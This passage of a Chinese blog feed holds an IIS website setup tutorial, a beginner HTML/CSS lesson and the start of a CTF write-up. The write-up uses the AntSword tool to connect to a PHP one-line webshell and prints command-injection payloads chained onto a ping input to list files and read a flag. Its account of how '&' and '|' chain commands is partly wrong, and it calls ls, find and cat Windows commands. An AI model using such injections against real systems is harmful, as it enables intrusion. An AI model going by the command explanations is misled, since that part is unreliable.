src="https://img-blog.csdnimg.cn/2020042814511041.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>8.选择默认网站，点击停止，因为不能同时开两个网站。<br><img src="https://img-blog.csdnimg.cn/2020042814514951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>9.右键点击自己创建的网站，点击启动。</p><p>10.自己在百度找一个asp源码，我选择这个。<br><img src="https://img-blog.csdnimg.cn/2020042814575890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>我选择了第一个。<br><img src="https://img-blog.csdnimg.cn/20200428145836339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>找到下载地址，随便挑个<br><img src="https://img-blog.csdnimg.cn/20200428145925479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>11.将下载好的压缩包，拖进虚拟机中，<br><img src="https://img-blog.csdnimg.cn/20200428150112754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>12.打开创建的网站<br><img src="https://img-blog.csdnimg.cn/20200428150234365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>13.双击打开压缩包。打开文件，<br>全部选中文件剪切(或复制)到网站的源码文件夹<br><img src="https://img-blog.csdnimg.cn/20200428150631894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>14.找找里面的<code>index.asp</code>,然后先关闭了这个文件夹<br>点击网站j4y，右键点击，选择属性，点击文档，全部删除内容文档。<br><img src="https://img-blog.csdnimg.cn/20200428150936427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>15..添加<code>index.asp</code>点击确定就行了。<br>16.点击“主目录”，选择“执行权限”，选择纯脚本。<br><img src="https://img-blog.csdnimg.cn/20200428151205199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>17.点击配置，<br><img src="https://img-blog.csdnimg.cn/2020042815132444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>18.点击“选择”——启用父路径<img src="https://img-blog.csdnimg.cn/20200428151408465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>19.选择“调试”——调试标志，两个全部勾选，点击确定。再次确定<br><img src="https://img-blog.csdnimg.cn/20200428151550181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>20.点击Web服务扩展，点击<code>Active Server Pages</code>，点击允许。<br><img src="https://img-blog.csdnimg.cn/20200428151649626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>21.点击j4y网站，右键点击，进行关闭和启动操作来达到重启的目的。<br>22.可以在浏览器中打开<code>127.0.0.1</code>打开网站。<br><img src="https://img-blog.csdnimg.cn/20200428152027653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>点击添加就行了。<br>然后会进入了你的网站<br><img src="https://img-blog.csdnimg.cn/202004281522402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>23.那么这个时候如何让别人也能访问这个网站呢？？<br>这个时候就需要别人访问虚拟机的IP地址来访问网站了。<br>获取IP地址就行了。<br>打开cmd，输入命令<code>ipconfig</code>就能获取到IP地址了。<br><img src="https://img-blog.csdnimg.cn/20200428153456200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><p>实验，我在主机上访问这个网站<br><img src="https://img-blog.csdnimg.cn/20200428153532151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><p>到这里，一个简单的网站就搭建成功了。</p><p>总结：第二次搭建，速度快了很多。学到很多，自己搭建成功后很开心，有收获就开心。加油，继续努力。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小白初学HTML</title>
      <link href="/2020/08/23/%E5%B0%8F%E7%99%BD%E5%88%9D%E5%AD%A6HTML/"/>
      <url>/2020/08/23/%E5%B0%8F%E7%99%BD%E5%88%9D%E5%AD%A6HTML/</url>
      
        <content type="html"><![CDATA[<p>本周学习HTML，我自己通过学习，可以自己制作一些简单的网页了，此期间我只学到表单提交这一块内容，以及几个简单的CSS语句。</p><h1 id="HTML简介"><a href="#HTML简介" class="headerlink" title="HTML简介"></a>HTML简介</h1><p><strong>HTML是互联网上应用最广泛的标记语言。HTML文件就是普通文本+HTML标记，而不同的HTML标记能表示不同的效果。现在学习的网页制作就是通过学习HTML来实现的。</strong></p><h1 id="HTML标签"><a href="#HTML标签" class="headerlink" title="HTML标签"></a>HTML标签</h1><p>HTML标签是由尖括号包围的关键词，并且标签都是成对出现的，标签对中的第一个标签是开始标签，第二个标签是结束标签，如<code>&lt;html&gt;...&lt;/html&gt;</code>开始和结束标签也可以叫做开放标签和闭合标签。<br>HTML标签有文本标签、图片标签、表格标签，地区标签……</p><h5 id="文本标签"><a href="#文本标签" class="headerlink" title="文本标签"></a>文本标签</h5><p>这里我举出几个常用的文本标签如下：换行标签<code>&lt;br&gt;</code>、空格标签<code>&amp;nbsp;、</code>将标签里的内容加粗<code>&lt;strong&gt;...&lt;/strong&gt;</code>、将内容变成斜体<code>&lt;em&gt;...&lt;/em&gt;</code>、在标签的文字上加一条横线<code>&lt;del&gt;...&lt;/del&gt;</code>如“<del>删除此条内容</del>”……</p><h5 id="2-图片标签："><a href="#2-图片标签：" class="headerlink" title="2.图片标签："></a>2.图片标签：</h5><p>图片类型：<br>jpg：有损压缩，且影响画质，图片较小。<br>png：无损压缩，不影响画质，但图片较大。<br>gif：动图。<br>**<em>下面，我举一个实例：**</em></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   &lt;img src=&quot;xiaohuangren.jpg&quot; alt=&quot;小黄人&quot;&gt;</span><br><span class="line">&lt;img src=&quot;nezha.png&quot; alt=&quot;哪吒&quot;&gt;</span><br><span class="line">&lt;img src=&quot;dongtu.gif&quot; alt=&quot;动图&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong><em>显示结果如下：</em></strong><br><img src="https://img-blog.csdnimg.cn/20200115010433728.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>图片方式：<br>1.网络图片：将图片链接直接放进去，如：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;图片网址&quot; alt=&quot;描述&quot;&gt;</span><br></pre></td></tr></table></figure><p>2.本地图片：<br>*绝对路径：从盘符算起的路径。<br>*相对路径：从当前路径算起的路径。<br>简单的办法就是将图片跟HTML网页放在同一个文件夹里。</p><h5 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h5><p>如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;http://www.mi.com&quot;&gt;超链接&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><strong>herf</strong> 是HTML一种属性。下面会说到。<br>按照这个例子，在网页中通过鼠标点击 <strong>“超链接”</strong>就会跳转到小米的官网。</p><h1 id="HTML属性"><a href="#HTML属性" class="headerlink" title="HTML属性"></a>HTML属性</h1><p>属性为HTML元素提供附加信息。<br>HTML标签可以拥有属性，且属性总是以名称/值对的形式出现，比如：<code>name=&quot;value&quot;</code>。<br>属性总是在HTML元素的开始标签中规定。<br>属性实例：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">属性例子1</span><br><span class="line">&lt;h1 align=&quot;center&quot;&gt;...&lt;/h1&gt;      拥有关于对齐方式的附加信息</span><br><span class="line">属性例子2</span><br><span class="line">&lt;body bgcolor=&quot;red&quot;&gt;...&lt;/body&gt;   拥有关于背景颜色的附加信息</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p>1.无序列表  <code>&lt;ul&gt;</code><br>2.有序列表  <code>&lt;ol&gt;</code><br>3.自定义列表  <code>&lt;dl&gt;</code></p><h1 id="HTML表格"><a href="#HTML表格" class="headerlink" title="HTML表格"></a>HTML表格</h1><p>表格形式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">table</span>&gt;</span><br><span class="line">&lt;!<span class="selector-tag">--</span>若干   行<span class="selector-tag">--</span>&gt;</span><br><span class="line">&lt;<span class="selector-tag">tr</span>&gt;</span><br><span class="line">&lt;!<span class="selector-tag">--</span>若干个   单元格<span class="selector-tag">--</span>&gt;</span><br><span class="line">&lt;th&gt;...&lt;/th&gt;   &lt;!--标题--&gt;</span><br><span class="line">&lt;/tr&gt;                      &lt;!--注意：表格是一行一行来完成的。--&gt;  </span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里还是举个实例：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;table border=&quot;2&quot;&gt;</span><br><span class="line">&lt;<span class="selector-tag">tr</span>&gt;</span><br><span class="line">   &lt;th style=&quot;color: red&quot;&gt;小组名&lt;/th&gt;</span><br><span class="line">   &lt;th style=&quot;color: red&quot;&gt;成员&lt;/th&gt;</span><br><span class="line">   &lt;th style=&quot;color: red&quot;&gt;段位&lt;/th&gt;</span><br><span class="line"></span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;<span class="selector-tag">tr</span>&gt;</span><br><span class="line">   &lt;th rowspan=&quot;4&quot; style=&quot;color: red&quot;&gt;XXXXXXXXX&lt;/th&gt;</span><br><span class="line">   &lt;th style=&quot;color: red&quot;&gt;小明&lt;/th&gt;</span><br><span class="line">   &lt;th style=&quot;color: red&quot;&gt;最强王者&lt;/th&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;<span class="selector-tag">tr</span>&gt;</span><br><span class="line">   &lt;th style=&quot;color: red&quot;&gt;小小明&lt;/th&gt;</span><br><span class="line">   &lt;th style=&quot;color: red&quot;&gt;最强王者&lt;/th&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;<span class="selector-tag">tr</span>&gt;</span><br><span class="line">   &lt;th style=&quot;color: red&quot;&gt;大明&lt;/th&gt;</span><br><span class="line">   &lt;th style=&quot;color: red&quot;&gt;至尊星耀&lt;/th&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;<span class="selector-tag">tr</span>&gt;</span><br><span class="line">   &lt;th style=&quot;color: red&quot;&gt;XXX&lt;/th&gt;</span><br><span class="line">   &lt;th style=&quot;color: red&quot;&gt;永恒钻石&lt;/th&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure><p>border是表格的一种属性。<br>页面显示为：<br><img src="https://img-blog.csdnimg.cn/20200115015129108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h1 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h1><p><code>&lt;form&gt;...&lt;/form&gt;</code><br>收集用户输入，发送或提交给服务器<br>·输入：内容<br>文本：1.普通文本，   2.密码文本（输入后看不到数字，只能看见星号。）<br>单选框 :       input标签 radio属性<br>多选框    :     input标签   checkbox属性<br>下拉框  :      select标签<br>地区标签:  <code>&lt;option&gt;...&lt;/option&gt;</code><br>提交：  提交按钮，说到提交按钮，就提一下http吧<br>http: 叫做超文本传输协议，浏览器和服务器的通讯协议。<br>http的一种模式：请求—应答<br>两种请求   GET      POST  常见的；<br>我也做了一个简单的表单：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="selector-tag">DOCTYPE</span> <span class="selector-tag">html</span>&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;<span class="selector-tag">head</span>&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;我的第一个网页&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body style=&quot;background: red&quot;&gt;</span><br><span class="line">&lt;form action=&quot;&quot;&gt;</span><br><span class="line">&lt;h1 style=&quot;color: blue&quot;&gt;账户登录&lt;/h1&gt;&lt;br&gt;</span><br><span class="line">    账号：&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;</span><br><span class="line">    密码：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span><br><span class="line">    性别：&lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt; 男</span><br><span class="line">         &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;  女</span><br><span class="line">         &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;  不详</span><br><span class="line">    &lt;<span class="selector-tag">br</span>&gt;</span><br><span class="line">    &lt;p style=&quot;color: gold&quot;&gt;所在地：&lt;/p&gt;</span><br><span class="line">    &lt;select name=&quot;city&quot;&gt;</span><br><span class="line">         &lt;option value=&quot;&quot;&gt;北京&lt;/option&gt;</span><br><span class="line">         &lt;option value=&quot;&quot;&gt;上海&lt;/option&gt;</span><br><span class="line">         &lt;option value=&quot;&quot;&gt;广州&lt;/option&gt;</span><br><span class="line">         &lt;option value=&quot;&quot;&gt;深圳&lt;/option&gt;</span><br><span class="line">    &lt;/select&gt;&lt;br&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>网页是这样的<br><img src="https://img-blog.csdnimg.cn/2020011502011820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h1 id="css"><a href="#css" class="headerlink" title="css"></a>css</h1><p><strong>CSS</strong>层叠样式表(Cascading Style Sheets)，是一种样式表语言，用来描述HTML。CSS描述了在屏幕、纸质、音频等其他媒体上的元素应该如何被渲染放置的问题。<br>CSS同意通过下面几种方式添加到HTML中：<br>1.内联样式：在HTML元素中使用“style”属性。是在开始标签中添加“style”属性。可以添加多种属性。这种样式比较常见。<br>2.内部样式表：在HTML文档头部<code>&lt;head&gt;</code>区域使用style元素，来包含CSS。<br><strong>样式1：</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="selector-tag">DOCTYPE</span> <span class="selector-tag">html</span>&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;<span class="selector-tag">head</span>&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;样式1&lt;/title&gt;</span><br><span class="line">    &lt;<span class="selector-tag">style</span>&gt;</span><br><span class="line">     <span class="selector-tag">div</span> &#123;</span><br><span class="line">     <span class="attribute">color</span>: red; <span class="attribute">width</span>: <span class="number">100px</span>; <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">     &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;<span class="selector-tag">body</span>&gt;</span><br><span class="line">&lt;div&gt;大西瓜1&lt;/div&gt;</span><br><span class="line">&lt;div style=&quot;color: red; width: 100px;height: 100px;&quot;&gt;大西瓜2&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>再看页面：<br><img src="https://img-blog.csdnimg.cn/20200116160323929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" loading="lazy"><br>这就是两种不同的插入方法，结果是一样的。<br><strong>对单个使用，推荐使用第一类方法，而对多个使用推荐第二类，比较省时省力。</strong><br>3.外部引用：在外部再创建一个CSS文件，插入HTML中。<br>话不多说，看样例。<br><strong>样例2：</strong><br><img src="https://img-blog.csdnimg.cn/20200116161811133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这里为了看的方便，分屏打开两个文件。<br><img src="https://img-blog.csdnimg.cn/20200116162215893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>注意：两个文件都必须先保存下来再打开才会成功看到想要的效果。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF题记————无事小记</title>
      <link href="/2020/08/23/%E6%88%91%E5%8F%88%E6%9D%A5%E2%80%9C%E6%89%AB%E2%80%9D%E9%A2%98%E4%BA%86%EF%BC%8C%E9%BA%BB%E6%BA%9C%E7%9A%84%EF%BC%8C%E6%8A%8Aflag%E4%BA%A4%E5%87%BA%E6%9D%A5%EF%BC%81%EF%BC%81%EF%BC%81/"/>
      <url>/2020/08/23/%E6%88%91%E5%8F%88%E6%9D%A5%E2%80%9C%E6%89%AB%E2%80%9D%E9%A2%98%E4%BA%86%EF%BC%8C%E9%BA%BB%E6%BA%9C%E7%9A%84%EF%BC%8C%E6%8A%8Aflag%E4%BA%A4%E5%87%BA%E6%9D%A5%EF%BC%81%EF%BC%81%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>前言：<br>不断学习，不断进步，加油。<br>本文目录</p><ul><li><a href="Augenstern"><a href="#1" target="_self">Web</a></a><br><a href="Augenstern"><a href="#2" target="_self">webshell</a></a><br><a href="Augenstern"><a href="#3" target="_self">command_execution</a></a><br><a href="Augenstern"><a href="#4" target="_self">xff_referer</a></a></li><li><a href="Augenstern"><a href="#5" target="_self">Misc</a></a><br><a href="Augenstern"><a href="#6" target="_self">基础破解</a></a><br><a href="Augenstern"><a href="#7" target="_self">镜子里面的世界</a></a><br><a href="Augenstern"><a href="#8" target="_self">教练，我..我想打CTF</a></a><ul><li><a href="Augenstern"><a href="#9" target="_self">Crypto</a></a><br><a href="Augenstern"><a href="#10" target="_self">凯撒？替换？呵呵!</a></a><br><a href="Augenstern"><a href="#11" target="_self">告诉你个秘密</a></a><br><a href="Augenstern"><a href="#12" target="_self">Crack it</a></a><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a><h3 id="1">Web</h3></h3><h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a><h5 id="2">webshell</h5></h1><img src="https://img-blog.csdnimg.cn/20200324103131740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>我也去百度，php一句话。听说是一句话木马。听说过，没玩过，学一下。<a href="https://baike.baidu.com/item/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/1845646?fr=aladdin">一句话木马百度百科</a>然后打开环境看看，发现一个比较干净的页面，就f12看看呗<br><img src="https://img-blog.csdnimg.cn/20200324104118560.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然而什么也看不出来，只能看懂那个php代码的主要部分是<code>shell</code>其他的找了好久也没找出来，御剑扫描也扫了，都找不出来。没办法了，找大佬写的wp吧，看了后发现是要用到工具的，中国蚁剑。这个我没有，装一个，早就想装了。百度很好找的，下载地址在GitHub上，<a href="https://github.com/AntSwordProject/">中国蚁剑github地址</a>，自行下载。怎么可能没有坑？不可能，看一下教程，奥，真简单。到自己了，去tm的坑。<br><img src="https://img-blog.csdnimg.cn/20200324104935279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这是我在解压那个加速器时出现的错误。当然可能是我脸黑，重新下载了好几遍都是这样，最后终于找到不对的地方了<br><img src="https://img-blog.csdnimg.cn/20200324105237195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个不要下载，往下翻。找到加速器<br><img src="https://img-blog.csdnimg.cn/20200324105350592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>点进去，不要急着download  zip，往下翻<br><img src="https://img-blog.csdnimg.cn/20200324105452395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个才是正确的，（选择与自己操作系统匹配的）下载就行了。安装的话就没啥错了。<br>开始解题<br><img src="https://img-blog.csdnimg.cn/20200324105831132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后写数据<br><img src="https://img-blog.csdnimg.cn/20200324105953312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>连接密码是shell因为那一行php一句话木马，点击添加就成功了。然后查看就看到flag了。结果就不展示了。<h1 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a><h5 id="3">command_execution</h5></h1>攻防世界的一道入门题，看到command应该是cmd，<br>题目：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。<br>ping只知道它可以pingIP地址，具体的干什么的其实不是特别清楚，去看下。<a href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/ping">ping官方解释</a><br>做这个题还要知道一点：cmd1 &amp;&amp; cmd2先执行cmd1再执行cmd2，cmd1 | cmd2 只执行cmd2，但不执行cmd1 ，cmd1 &amp; cmd2 先执行cmd2，再执行cmd1.<br>然后就构造三个Windows命令来解题<br>payload<br><code>127.0.0.1 &amp;&amp; ls</code>尝试用ls获取当前目录<br><code>127.0.0.1 &amp;&amp;find / -name &quot;*.txt&quot;</code>寻找txt文件<br><img src="https://img-blog.csdnimg.cn/2020032422014410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br><code>127.0.0.1 &amp;&amp; cat/home/flag.txt</code>找到flag<br><img src="https://img-blog.csdnimg.cn/2020032422021861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这道题还是要对Windows命令进行了解的。<a href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/windows-commands">Windows命令</a></li></ul></li></ul><h1 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a><h5 id="4">xff_referer</h5></h1><p><img 